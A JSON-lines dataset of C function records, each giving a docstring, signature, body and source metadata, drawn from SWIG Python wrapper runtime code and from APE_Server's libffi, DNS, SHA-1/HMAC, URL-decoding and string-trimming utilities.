{"docstring": "/*\n  Create a new instance object, without calling __init__, and set the\n  'this' attribute.\n*/\n", "func_signal": "SWIGRUNTIME PyObject* \nSWIG_Python_NewShadowInstance(SwigPyClientData *data, PyObject *swig_this)", "code": "{\n#if (PY_VERSION_HEX >= 0x02020000)\n  PyObject *inst = 0;\n  PyObject *newraw = data->newraw;\n  if (newraw) {\n    inst = PyObject_Call(newraw, data->newargs, NULL);\n    if (inst) {\n#if !defined(SWIG_PYTHON_SLOW_GETSET_THIS)\n      PyObject **dictptr = _PyObject_GetDictPtr(inst);\n      if (dictptr != NULL) {\n\tPyObject *dict = *dictptr;\n\tif (dict == NULL) {\n\t  dict = PyDict_New();\n\t  *dictptr = dict;\n\t  PyDict_SetItem(dict, SWIG_This(), swig_this);\n\t}\n      }\n#else\n      PyObject *key = SWIG_This();\n      PyObject_SetAttr(inst, key, swig_this);\n#endif\n    }\n  } else {\n#if PY_VERSION_HEX >= 0x03000000\n    inst = ((PyTypeObject*) data->newargs)->tp_new((PyTypeObject*) data->newargs, Py_None, Py_None);\n    if (inst) {\n      PyObject_SetAttr(inst, SWIG_This(), swig_this);\n      Py_TYPE(inst)->tp_flags &= ~Py_TPFLAGS_VALID_VERSION_TAG;\n    }\n#else\n    PyObject *dict = PyDict_New();\n    if (dict) {\n      PyDict_SetItem(dict, SWIG_This(), swig_this);\n      inst = PyInstance_NewRaw(data->newargs, dict);\n      Py_DECREF(dict);\n    }\n#endif\n  }\n  return inst;\n#else\n#if (PY_VERSION_HEX >= 0x02010000)\n  PyObject *inst = 0;\n  PyObject *dict = PyDict_New();\n  if (dict) {\n    PyDict_SetItem(dict, SWIG_This(), swig_this);\n    inst = PyInstance_NewRaw(data->newargs, dict);\n    Py_DECREF(dict);\n  }\n  return (PyObject *) inst;\n#else\n  PyInstanceObject *inst = PyObject_NEW(PyInstanceObject, &PyInstance_Type);\n  if (inst == NULL) {\n    return NULL;\n  }\n  inst->in_class = (PyClassObject *)data->newargs;\n  Py_INCREF(inst->in_class);\n  inst->in_dict = PyDict_New();\n  if (inst->in_dict == NULL) {\n    Py_DECREF(inst);\n    return NULL;\n  }\n#ifdef Py_TPFLAGS_HAVE_WEAKREFS\n  inst->in_weakreflist = NULL;\n#endif\n#ifdef Py_TPFLAGS_GC\n  PyObject_GC_Init(inst);\n#endif\n  PyDict_SetItem(inst->in_dict, SWIG_This(), swig_this);\n  return (PyObject *) inst;\n#endif\n#endif\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n  Search for a swig_type_info structure for either a mangled name or a human readable name.\n  It first searches the mangled names of the types, which is a O(log #types)\n  If a type is not found it then searches the human readable names, which is O(#types).\n\n  We start searching at module start, and finish searching when start == end.\n  Note: if start == end at the beginning of the function, we go all the way around\n  the circular list.\n*/\n", "func_signal": "SWIGRUNTIME swig_type_info *\nSWIG_TypeQueryModule(swig_module_info *start,\n                     swig_module_info *end,\n\t\t     const char *name)", "code": "{\n  /* STEP 1: Search the name field using binary search */\n  swig_type_info *ret = SWIG_MangledTypeQueryModule(start, end, name);\n  if (ret) {\n    return ret;\n  } else {\n    /* STEP 2: If the type hasn't been found, do a complete search\n       of the str field (the human readable name) */\n    swig_module_info *iter = start;\n    do {\n      size_t i = 0;\n      for (; i < iter->size; ++i) {\n\tif (iter->types[i]->str && (SWIG_TypeEquiv(iter->types[i]->str, name)))\n\t  return iter->types[i];\n      }\n      iter = iter->next;\n    } while (iter != end);\n  }\n\n  /* neither found a match */\n  return 0;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n  Return the pretty name associated with this type,\n  that is an unmangled type name in a form presentable to the user.\n*/\n", "func_signal": "SWIGRUNTIME const char *\nSWIG_TypePrettyName(const swig_type_info *type)", "code": "{\n  /* The \"str\" field contains the equivalent pretty names of the\n     type, separated by vertical-bar characters.  We choose\n     to print the last name, as it is often (?) the most\n     specific. */\n  if (!type) return NULL;\n  if (type->str != NULL) {\n    const char *last_name = type->str;\n    const char *s;\n    for (s = type->str; *s; s++)\n      if (*s == '|') last_name = s+1;\n    return last_name;\n  }\n  else\n    return type->name;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Warning: This function will allocate a new string in Python 3,\n * so please call SWIG_Python_str_DelForPy3(x) to free the space.\n */\n", "func_signal": "SWIGINTERN char*\nSWIG_Python_str_AsChar(PyObject *str)", "code": "{\n#if PY_VERSION_HEX >= 0x03000000\n  char *cstr;\n  char *newstr;\n  Py_ssize_t len;\n  str = PyUnicode_AsUTF8String(str);\n  PyBytes_AsStringAndSize(str, &cstr, &len);\n  newstr = (char *) malloc(len+1);\n  memcpy(newstr, cstr, len+1);\n  Py_XDECREF(str);\n  return newstr;\n#else\n  return PyString_AsString(str);\n#endif\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n  Search for a swig_type_info structure only by mangled name\n  Search is a O(log #types)\n\n  We start searching at module start, and finish searching when start == end.\n  Note: if start == end at the beginning of the function, we go all the way around\n  the circular list.\n*/\n", "func_signal": "SWIGRUNTIME swig_type_info *\nSWIG_MangledTypeQueryModule(swig_module_info *start,\n                            swig_module_info *end,\n\t\t            const char *name)", "code": "{\n  swig_module_info *iter = start;\n  do {\n    if (iter->size) {\n      size_t l = 0;\n      size_t r = iter->size - 1;\n      do {\n\t/* since l+r >= 0, we can (>> 1) instead (/ 2) */\n\tsize_t i = (l + r) >> 1;\n\tconst char *iname = iter->types[i]->name;\n\tif (iname) {\n\t  int compare = strcmp(name, iname);\n\t  if (compare == 0) {\n\t    return iter->types[i];\n\t  } else if (compare < 0) {\n\t    if (i) {\n\t      r = i - 1;\n\t    } else {\n\t      break;\n\t    }\n\t  } else if (compare > 0) {\n\t    l = i + 1;\n\t  }\n\t} else {\n\t  break; /* should never happen */\n\t}\n      } while (l <= r);\n    }\n    iter = iter->next;\n  } while (iter != end);\n  return 0;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n   Unpack binary data from a string\n*/\n", "func_signal": "SWIGRUNTIME const char *\nSWIG_UnpackData(const char *c, void *ptr, size_t sz)", "code": "{\n  unsigned char *u = (unsigned char *) ptr;\n  const unsigned char *eu = u + sz;\n  for (; u != eu; ++u) {\n    char d = *(c++);\n    unsigned char uu;\n    if ((d >= '0') && (d <= '9'))\n      uu = (unsigned char)((d - '0') << 4);\n    else if ((d >= 'a') && (d <= 'f'))\n      uu = (unsigned char)((d - ('a'-10)) << 4);\n    else\n      return (char *) 0;\n    d = *(c++);\n    if ((d >= '0') && (d <= '9'))\n      uu |= (unsigned char)(d - '0');\n    else if ((d >= 'a') && (d <= 'f'))\n      uu |= (unsigned char)(d - ('a'-10));\n    else\n      return (char *) 0;\n    *u = uu;\n  }\n  return c;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Error manipulation */\n", "func_signal": "SWIGINTERN void \nSWIG_Python_SetErrorObj(PyObject *errtype, PyObject *obj)", "code": "{\n  SWIG_PYTHON_THREAD_BEGIN_BLOCK; \n  PyErr_SetObject(errtype, obj);\n  Py_DECREF(obj);\n  SWIG_PYTHON_THREAD_END_BLOCK;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n   Set the clientdata field for a type\n*/\n", "func_signal": "SWIGRUNTIME void\nSWIG_TypeClientData(swig_type_info *ti, void *clientdata)", "code": "{\n  swig_cast_info *cast = ti->cast;\n  /* if (ti->clientdata == clientdata) return; */\n  ti->clientdata = clientdata;\n\n  while (cast) {\n    if (!cast->converter) {\n      swig_type_info *tc = cast->type;\n      if (!tc->clientdata) {\n\tSWIG_TypeClientData(tc, clientdata);\n      }\n    }\n    cast = cast->next;\n  }\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Perform machine dependent cif processing */\n", "func_signal": "ffi_status ffi_prep_cif_machdep(ffi_cif *cif)", "code": "{\n  unsigned int i;\n  ffi_type **ptr;\n\n  /* Set the return type flag */\n  switch (cif->rtype->type)\n    {\n    case FFI_TYPE_VOID:\n    case FFI_TYPE_UINT8:\n    case FFI_TYPE_UINT16:\n    case FFI_TYPE_SINT8:\n    case FFI_TYPE_SINT16:\n#ifdef X86_WIN64\n    case FFI_TYPE_UINT32:\n    case FFI_TYPE_SINT32:\n#endif\n    case FFI_TYPE_SINT64:\n    case FFI_TYPE_FLOAT:\n    case FFI_TYPE_DOUBLE:\n#ifndef X86_WIN64\n#if FFI_TYPE_DOUBLE != FFI_TYPE_LONGDOUBLE\n    case FFI_TYPE_LONGDOUBLE:\n#endif\n#endif\n      cif->flags = (unsigned) cif->rtype->type;\n      break;\n\n    case FFI_TYPE_UINT64:\n#ifdef X86_WIN64\n    case FFI_TYPE_POINTER:\n#endif\n      cif->flags = FFI_TYPE_SINT64;\n      break;\n\n    case FFI_TYPE_STRUCT:\n#ifndef X86\n      if (cif->rtype->size == 1)\n        {\n          cif->flags = FFI_TYPE_SMALL_STRUCT_1B; /* same as char size */\n        }\n      else if (cif->rtype->size == 2)\n        {\n          cif->flags = FFI_TYPE_SMALL_STRUCT_2B; /* same as short size */\n        }\n      else if (cif->rtype->size == 4)\n        {\n#ifdef X86_WIN64\n          cif->flags = FFI_TYPE_SMALL_STRUCT_4B;\n#else\n          cif->flags = FFI_TYPE_INT; /* same as int type */\n#endif\n        }\n      else if (cif->rtype->size == 8)\n        {\n          cif->flags = FFI_TYPE_SINT64; /* same as int64 type */\n        }\n      else\n#endif\n        {\n          cif->flags = FFI_TYPE_STRUCT;\n          /* allocate space for return value pointer */\n          cif->bytes += ALIGN(sizeof(void*), FFI_SIZEOF_ARG);\n        }\n      break;\n\n    default:\n#ifdef X86_WIN64\n      cif->flags = FFI_TYPE_SINT64;\n      break;\n    case FFI_TYPE_INT:\n      cif->flags = FFI_TYPE_SINT32;\n#else\n      cif->flags = FFI_TYPE_INT;\n#endif\n      break;\n    }\n\n  for (ptr = cif->arg_types, i = cif->nargs; i > 0; i--, ptr++)\n    {\n      if (((*ptr)->alignment - 1) & cif->bytes)\n        cif->bytes = ALIGN(cif->bytes, (*ptr)->alignment);\n      cif->bytes += ALIGN((*ptr)->size, FFI_SIZEOF_ARG);\n    }\n\n#ifdef X86_WIN64\n  /* ensure space for storing four registers */\n  cif->bytes += 4 * sizeof(ffi_arg);\n#endif\n\n#ifdef X86_DARWIN\n  cif->bytes = (cif->bytes + 15) & ~0xF;\n#endif\n\n  return FFI_OK;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\x86\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* verbosity level:\n * <0 - bare result\n *  0 - bare result and error messages\n *  1 - readable result\n *  2 - received packet contents and `trying ...' stuff\n *  3 - sent and received packet contents\n */\n", "func_signal": "static void die(int errnum, const char *fmt, ...)", "code": "{\n  va_list ap;\n  fprintf(stderr, \"%s: \", progname);\n  va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap);\n  if (errnum) fprintf(stderr, \": %s\\n\", strerror(errnum));\n  else putc('\\n', stderr);\n  fflush(stderr);\n  exit(1);\n}", "path": "deps\\udns-0.0.9\\dnsget.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*\n * Core SHA-1 functions\n */\n", "func_signal": "void sha1_starts( sha1_context *ctx )", "code": "{\n    ctx->total[0] = 0;\n    ctx->total[1] = 0;\n\n    ctx->state[0] = 0x67452301;\n    ctx->state[1] = 0xEFCDAB89;\n    ctx->state[2] = 0x98BADCFE;\n    ctx->state[3] = 0x10325476;\n    ctx->state[4] = 0xC3D2E1F0;\n}", "path": "src\\sha1.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*====================================================================*/\n/*                                                                    */\n/* Name     - ffi_prep_closure_loc.                                   */\n/*                                                                    */\n/* Function - Prepare a FFI closure.                                  */\n/*                                                                    */\n/*====================================================================*/\n", "func_signal": "ffi_status\nffi_prep_closure_loc (ffi_closure *closure,\n\t\t      ffi_cif *cif,\n\t\t      void (*fun) (ffi_cif *, void *, void **, void *),\n\t\t      void *user_data,\n\t\t      void *codeloc)", "code": "{\n  FFI_ASSERT (cif->abi == FFI_SYSV);\n\n#ifndef __s390x__\n  *(short *)&closure->tramp [0] = 0x0d10;   /* basr %r1,0 */\n  *(short *)&closure->tramp [2] = 0x9801;   /* lm %r0,%r1,6(%r1) */\n  *(short *)&closure->tramp [4] = 0x1006;\n  *(short *)&closure->tramp [6] = 0x07f1;   /* br %r1 */\n  *(long  *)&closure->tramp [8] = (long)codeloc;\n  *(long  *)&closure->tramp[12] = (long)&ffi_closure_SYSV;\n#else\n  *(short *)&closure->tramp [0] = 0x0d10;   /* basr %r1,0 */\n  *(short *)&closure->tramp [2] = 0xeb01;   /* lmg %r0,%r1,14(%r1) */\n  *(short *)&closure->tramp [4] = 0x100e;\n  *(short *)&closure->tramp [6] = 0x0004;\n  *(short *)&closure->tramp [8] = 0x07f1;   /* br %r1 */\n  *(long  *)&closure->tramp[16] = (long)codeloc;\n  *(long  *)&closure->tramp[24] = (long)&ffi_closure_SYSV;\n#endif \n \n  closure->cif = cif;\n  closure->user_data = user_data;\n  closure->fun = fun;\n \n  return FFI_OK;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\s390\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* ffi_prep_args is called by the assembly routine once stack space\n   has been allocated for the function's arguments\n   \n   The vfp_space parameter is the load area for VFP regs, the return\n   value is cif->vfp_used (word bitset of VFP regs used for passing\n   arguments). These are only used for the VFP hard-float ABI.\n*/\n", "func_signal": "int ffi_prep_args(char *stack, extended_cif *ecif, float *vfp_space)", "code": "{\n  register unsigned int i, vi = 0;\n  register void **p_argv;\n  register char *argp;\n  register ffi_type **p_arg;\n\n  argp = stack;\n\n  if ( ecif->cif->flags == FFI_TYPE_STRUCT ) {\n    *(void **) argp = ecif->rvalue;\n    argp += 4;\n  }\n\n  p_argv = ecif->avalue;\n\n  for (i = ecif->cif->nargs, p_arg = ecif->cif->arg_types;\n       (i != 0);\n       i--, p_arg++)\n    {\n      size_t z;\n\n      /* Allocated in VFP registers. */\n      if (ecif->cif->abi == FFI_VFP\n\t  && vi < ecif->cif->vfp_nargs && vfp_type_p (*p_arg))\n\t{\n\t  float* vfp_slot = vfp_space + ecif->cif->vfp_args[vi++];\n\t  if ((*p_arg)->type == FFI_TYPE_FLOAT)\n\t    *((float*)vfp_slot) = *((float*)*p_argv);\n\t  else if ((*p_arg)->type == FFI_TYPE_DOUBLE)\n\t    *((double*)vfp_slot) = *((double*)*p_argv);\n\t  else\n\t    memcpy(vfp_slot, *p_argv, (*p_arg)->size);\n\t  p_argv++;\n\t  continue;\n\t}\n\n      /* Align if necessary */\n      if (((*p_arg)->alignment - 1) & (unsigned) argp) {\n\targp = (char *) ALIGN(argp, (*p_arg)->alignment);\n      }\n\n      if ((*p_arg)->type == FFI_TYPE_STRUCT)\n\targp = (char *) ALIGN(argp, 4);\n\n\t  z = (*p_arg)->size;\n\t  if (z < sizeof(int))\n\t    {\n\t      z = sizeof(int);\n\t      switch ((*p_arg)->type)\n\t\t{\n\t\tcase FFI_TYPE_SINT8:\n\t\t  *(signed int *) argp = (signed int)*(SINT8 *)(* p_argv);\n\t\t  break;\n\t\t  \n\t\tcase FFI_TYPE_UINT8:\n\t\t  *(unsigned int *) argp = (unsigned int)*(UINT8 *)(* p_argv);\n\t\t  break;\n\t\t  \n\t\tcase FFI_TYPE_SINT16:\n\t\t  *(signed int *) argp = (signed int)*(SINT16 *)(* p_argv);\n\t\t  break;\n\t\t  \n\t\tcase FFI_TYPE_UINT16:\n\t\t  *(unsigned int *) argp = (unsigned int)*(UINT16 *)(* p_argv);\n\t\t  break;\n\t\t  \n\t\tcase FFI_TYPE_STRUCT:\n\t\t  memcpy(argp, *p_argv, (*p_arg)->size);\n\t\t  break;\n\n\t\tdefault:\n\t\t  FFI_ASSERT(0);\n\t\t}\n\t    }\n\t  else if (z == sizeof(int))\n\t    {\n\t      *(unsigned int *) argp = (unsigned int)*(UINT32 *)(* p_argv);\n\t    }\n\t  else\n\t    {\n\t      memcpy(argp, *p_argv, z);\n\t    }\n\t  p_argv++;\n\t  argp += z;\n    }\n\n  /* Indicate the VFP registers used. */\n  return ecif->cif->vfp_used;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\arm\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* Below are routines for VFP hard-float support. */\n", "func_signal": "static int rec_vfp_type_p (ffi_type *t, int *elt, int *elnum)", "code": "{\n  switch (t->type)\n    {\n    case FFI_TYPE_FLOAT:\n    case FFI_TYPE_DOUBLE:\n      *elt = (int) t->type;\n      *elnum = 1;\n      return 1;\n\n    case FFI_TYPE_STRUCT_VFP_FLOAT:\n      *elt = FFI_TYPE_FLOAT;\n      *elnum = t->size / sizeof (float);\n      return 1;\n\n    case FFI_TYPE_STRUCT_VFP_DOUBLE:\n      *elt = FFI_TYPE_DOUBLE;\n      *elnum = t->size / sizeof (double);\n      return 1;\n\n    case FFI_TYPE_STRUCT:;\n      {\n\tint base_elt = 0, total_elnum = 0;\n\tffi_type **el = t->elements;\n\twhile (*el)\n\t  {\n\t    int el_elt = 0, el_elnum = 0;\n\t    if (! rec_vfp_type_p (*el, &el_elt, &el_elnum)\n\t\t|| (base_elt && base_elt != el_elt)\n\t\t|| total_elnum + el_elnum > 4)\n\t      return 0;\n\t    base_elt = el_elt;\n\t    total_elnum += el_elnum;\n\t    el++;\n\t  }\n\t*elnum = total_elnum;\n\t*elt = base_elt;\n\treturn 1;\n      }\n    default: ;\n    }\n  return 0;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\arm\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*\n * Output HMAC-SHA-1(key,buf)\n */\n", "func_signal": "void sha1_hmac( uchar *key, uint keylen, uchar *buf, uint buflen,\n                uchar digest[20] )", "code": "{\n    uint i;\n    sha1_context ctx;\n    uchar k_ipad[64];\n    uchar k_opad[64];\n    uchar tmpbuf[20];\n\n    memset( k_ipad, 0x36, 64 );\n    memset( k_opad, 0x5C, 64 );\n\n    for( i = 0; i < keylen; i++ )\n    {\n        if( i >= 64 ) break;\n\n        k_ipad[i] ^= key[i];\n        k_opad[i] ^= key[i];\n    }\n\n    sha1_starts( &ctx );\n    sha1_update( &ctx, k_ipad, 64 );\n    sha1_update( &ctx, buf, buflen );\n    sha1_finish( &ctx, tmpbuf );\n\n    sha1_starts( &ctx );\n    sha1_update( &ctx, k_opad, 64 );\n    sha1_update( &ctx, tmpbuf, 20 );\n    sha1_finish( &ctx, digest );\n\n    memset( k_ipad, 0, 64 );\n    memset( k_opad, 0, 64 );\n    memset( tmpbuf, 0, 20 );\n    memset( &ctx, 0, sizeof( sha1_context ) );\n}", "path": "src\\sha1.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*====================================================================*/\n/*                                                                    */\n/* Name     - ffi_call.                                               */\n/*                                                                    */\n/* Function - Call the FFI routine.                                   */\n/*                                                                    */\n/*====================================================================*/\n", "func_signal": "void\nffi_call(ffi_cif *cif,\n\t void (*fn)(void),\n\t void *rvalue,\n\t void **avalue)", "code": "{\n  int ret_type = cif->flags;\n  extended_cif ecif;\n \n  ecif.cif    = cif;\n  ecif.avalue = avalue;\n  ecif.rvalue = rvalue;\n\n  /* If we don't have a return value, we need to fake one.  */\n  if (rvalue == NULL)\n    {\n      if (ret_type == FFI390_RET_STRUCT)\n\tecif.rvalue = alloca (cif->rtype->size);\n      else\n\tret_type = FFI390_RET_VOID;\n    } \n\n  switch (cif->abi)\n    {\n      case FFI_SYSV:\n        ffi_call_SYSV (cif->bytes, &ecif, ffi_prep_args,\n\t\t       ret_type, ecif.rvalue, fn);\n        break;\n \n      default:\n        FFI_ASSERT (0);\n        break;\n    }\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\s390\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* taken from lighttp */\n", "func_signal": "int urldecode(char *string)", "code": "{\n\tunsigned char high, low;\n\tconst char *src;\n\tchar *dst;\n\n\tif (string == NULL || !string) return -1;\n\n\tsrc = (const char *) string;\n\tdst = (char *) string;\n\n\twhile ((*src) != '\\0') {\n\t\tif (*src == '%') {\n\t\t\t*dst = '%';\n\n\t\t\thigh = hex2int(*(src + 1));\n\t\t\tif (high != 0xFF) {\n\t\t\t\tlow = hex2int(*(src + 2));\n\t\t\t\tif (low != 0xFF) {\n\t\t\t\t\thigh = (high << 4) | low;\n\n\t\t\t\t\tif (high < 32 || high == 127) high = '_';\n\n\t\t\t\t\t*dst = high;\n\t\t\t\t\tsrc += 2;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\t*dst = *src;\n\t\t}\n\n\t\tdst++;\n\t\tsrc++;\n\t}\n\n\t*dst = '\\0';\n\n\treturn 1;\n}", "path": "src\\utils.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* Perform machine dependent cif processing */\n", "func_signal": "ffi_status ffi_prep_cif_machdep(ffi_cif *cif)", "code": "{\n  int type_code;\n  /* Round the stack up to a multiple of 8 bytes.  This isn't needed \n     everywhere, but it is on some platforms, and it doesn't harm anything\n     when it isn't needed.  */\n  cif->bytes = (cif->bytes + 7) & ~7;\n\n  /* Set the return type flag */\n  switch (cif->rtype->type)\n    {\n    case FFI_TYPE_VOID:\n    case FFI_TYPE_FLOAT:\n    case FFI_TYPE_DOUBLE:\n      cif->flags = (unsigned) cif->rtype->type;\n      break;\n\n    case FFI_TYPE_SINT64:\n    case FFI_TYPE_UINT64:\n      cif->flags = (unsigned) FFI_TYPE_SINT64;\n      break;\n\n    case FFI_TYPE_STRUCT:\n      if (cif->abi == FFI_VFP\n\t  && (type_code = vfp_type_p (cif->rtype)) != 0)\n\t{\n\t  /* A Composite Type passed in VFP registers, either\n\t     FFI_TYPE_STRUCT_VFP_FLOAT or FFI_TYPE_STRUCT_VFP_DOUBLE. */\n\t  cif->flags = (unsigned) type_code;\n\t}\n      else if (cif->rtype->size <= 4)\n\t/* A Composite Type not larger than 4 bytes is returned in r0.  */\n\tcif->flags = (unsigned)FFI_TYPE_INT;\n      else\n\t/* A Composite Type larger than 4 bytes, or whose size cannot\n\t   be determined statically ... is stored in memory at an\n\t   address passed [in r0].  */\n\tcif->flags = (unsigned)FFI_TYPE_STRUCT;\n      break;\n\n    default:\n      cif->flags = FFI_TYPE_INT;\n      break;\n    }\n\n  /* Map out the register placements of VFP register args.\n     The VFP hard-float calling conventions are slightly more sophisticated than\n     the base calling conventions, so we do it here instead of in ffi_prep_args(). */\n  if (cif->abi == FFI_VFP)\n    layout_vfp_args (cif);\n\n  return FFI_OK;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\arm\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*====================================================================*/\n/*                                                                    */\n/* Name     - ffi_prep_cif_machdep.                                   */\n/*                                                                    */\n/* Function - Perform machine dependent CIF processing.               */\n/*                                                                    */\n/*====================================================================*/\n", "func_signal": "ffi_status\nffi_prep_cif_machdep(ffi_cif *cif)", "code": "{\n  size_t struct_size = 0;\n  int n_gpr = 0;\n  int n_fpr = 0;\n  int n_ov = 0;\n\n  ffi_type **ptr;\n  int i;\n\n  /* Determine return value handling.  */ \n\n  switch (cif->rtype->type)\n    {\n      /* Void is easy.  */\n      case FFI_TYPE_VOID:\n\tcif->flags = FFI390_RET_VOID;\n\tbreak;\n\n      /* Structures are returned via a hidden pointer.  */\n      case FFI_TYPE_STRUCT:\n\tcif->flags = FFI390_RET_STRUCT;\n\tn_gpr++;  /* We need one GPR to pass the pointer.  */\n\tbreak; \n\n      /* Floating point values are returned in fpr 0.  */\n      case FFI_TYPE_FLOAT:\n\tcif->flags = FFI390_RET_FLOAT;\n\tbreak;\n\n      case FFI_TYPE_DOUBLE:\n\tcif->flags = FFI390_RET_DOUBLE;\n\tbreak;\n\n#if FFI_TYPE_LONGDOUBLE != FFI_TYPE_DOUBLE\n      case FFI_TYPE_LONGDOUBLE:\n\tcif->flags = FFI390_RET_STRUCT;\n\tn_gpr++;\n\tbreak;\n#endif\n      /* Integer values are returned in gpr 2 (and gpr 3\n\t for 64-bit values on 31-bit machines).  */\n      case FFI_TYPE_UINT64:\n      case FFI_TYPE_SINT64:\n\tcif->flags = FFI390_RET_INT64;\n\tbreak;\n\n      case FFI_TYPE_POINTER:\n      case FFI_TYPE_INT:\n      case FFI_TYPE_UINT32:\n      case FFI_TYPE_SINT32:\n      case FFI_TYPE_UINT16:\n      case FFI_TYPE_SINT16:\n      case FFI_TYPE_UINT8:\n      case FFI_TYPE_SINT8:\n\t/* These are to be extended to word size.  */\n#ifdef __s390x__\n\tcif->flags = FFI390_RET_INT64;\n#else\n\tcif->flags = FFI390_RET_INT32;\n#endif\n\tbreak;\n \n      default:\n        FFI_ASSERT (0);\n        break;\n    }\n\n  /* Now for the arguments.  */\n \n  for (ptr = cif->arg_types, i = cif->nargs;\n       i > 0;\n       i--, ptr++)\n    {\n      int type = (*ptr)->type;\n\n#if FFI_TYPE_LONGDOUBLE != FFI_TYPE_DOUBLE\n      /* 16-byte long double is passed like a struct.  */\n      if (type == FFI_TYPE_LONGDOUBLE)\n\ttype = FFI_TYPE_STRUCT;\n#endif\n\n      /* Check how a structure type is passed.  */\n      if (type == FFI_TYPE_STRUCT)\n\t{\n\t  type = ffi_check_struct_type (*ptr);\n\n\t  /* If we pass the struct via pointer, we must reserve space\n\t     to copy its data for proper call-by-value semantics.  */\n\t  if (type == FFI_TYPE_POINTER)\n\t    struct_size += ROUND_SIZE ((*ptr)->size);\n\t}\n\n      /* Now handle all primitive int/float data types.  */\n      switch (type) \n\t{\n\t  /* The first MAX_FPRARGS floating point arguments\n\t     go in FPRs, the rest overflow to the stack.  */\n\n\t  case FFI_TYPE_DOUBLE:\n\t    if (n_fpr < MAX_FPRARGS)\n\t      n_fpr++;\n\t    else\n\t      n_ov += sizeof (double) / sizeof (long);\n\t    break;\n\t\n\t  case FFI_TYPE_FLOAT:\n\t    if (n_fpr < MAX_FPRARGS)\n\t      n_fpr++;\n\t    else\n\t      n_ov++;\n\t    break;\n\n\t  /* On 31-bit machines, 64-bit integers are passed in GPR pairs,\n\t     if one is still available, or else on the stack.  If only one\n\t     register is free, skip the register (it won't be used for any \n\t     subsequent argument either).  */\n\t      \n#ifndef __s390x__\n\t  case FFI_TYPE_UINT64:\n\t  case FFI_TYPE_SINT64:\n\t    if (n_gpr == MAX_GPRARGS-1)\n\t      n_gpr = MAX_GPRARGS;\n\t    if (n_gpr < MAX_GPRARGS)\n\t      n_gpr += 2;\n\t    else\n\t      n_ov += 2;\n\t    break;\n#endif\n\n\t  /* Everything else is passed in GPRs (until MAX_GPRARGS\n\t     have been used) or overflows to the stack.  */\n\n\t  default: \n\t    if (n_gpr < MAX_GPRARGS)\n\t      n_gpr++;\n\t    else\n\t      n_ov++;\n\t    break;\n        }\n    }\n\n  /* Total stack space as required for overflow arguments\n     and temporary structure copies.  */\n\n  cif->bytes = ROUND_SIZE (n_ov * sizeof (long)) + struct_size;\n \n  return FFI_OK;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\s390\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* Taken from a random source */\n", "func_signal": "char *trim(char *s)", "code": "{\n\tint i = 0, j;\n\t\n\twhile (s[i] == ' ' || s[i] == '\\t' || s[i] == '\\n' || s[i] == '\\r') {\n\t\ti++;\n\t}\n\tif (i > 0) {\n\t\tfor(j = 0; j < strlen(s); j++) {\n\t\t\ts[j] = s[j+i];\n\t\t}\n\t\ts[j] = '\\0';\n\t}\n\n\ti = strlen(s) - 1;\n\t\n\twhile (s[i] == ' ' || s[i] == '\\t' || s[i] == '\\n' || s[i] == '\\r') {\n\t\ti--;\n\t}\n\tif (i < (strlen(s) - 1)) {\n\t\ts[i+1] = '\\0';\n\t}\n\treturn s;\n}", "path": "src\\utils.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
